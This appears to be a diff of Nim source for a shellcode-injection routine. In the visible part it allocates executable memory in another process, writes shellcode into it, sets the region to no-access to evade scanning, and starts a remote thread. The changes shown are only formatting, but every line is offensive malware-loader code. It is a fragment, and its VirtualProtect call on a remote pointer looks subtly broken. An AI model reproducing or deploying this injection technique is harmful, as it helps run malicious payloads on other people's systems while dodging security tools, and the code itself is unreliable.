@@ -18,13 +18,7 @@ proc suspendedThread[byte](shellcode: openArray[byte]): void =
   )
   defer: CloseHandle(pHandle)
 
-  let rPtr = VirtualAllocEx(
-    pHandle,
-    NULL,
-    cast[SIZE_T](shellcode.len),
-    MEM_COMMIT,
-    PAGE_EXECUTE_READ_WRITE
-  )
+  let rPtr = VirtualAllocEx(pHandle, NULL, cast[SIZE_T](shellcode.len), MEM_COMMIT, PAGE_EXECUTE_READ_WRITE)
 
   var bytesWritten: SIZE_T
   let wSuccess = WriteProcessMemory(
@@ -35,7 +29,7 @@ proc suspendedThread[byte](shellcode: openArray[byte]): void =
     addr bytesWritten
   )
 
-  VirtualProtect(cast[LPVOID](rPtr), shellcode.len, PAGE_NOACCESS,addr op)
+  VirtualProtect(cast[LPVOID](rPtr), shellcode.len, PAGE_NOACCESS, addr op)
   let tHandle = CreateRemoteThread(
     pHandle, 
     NULL,
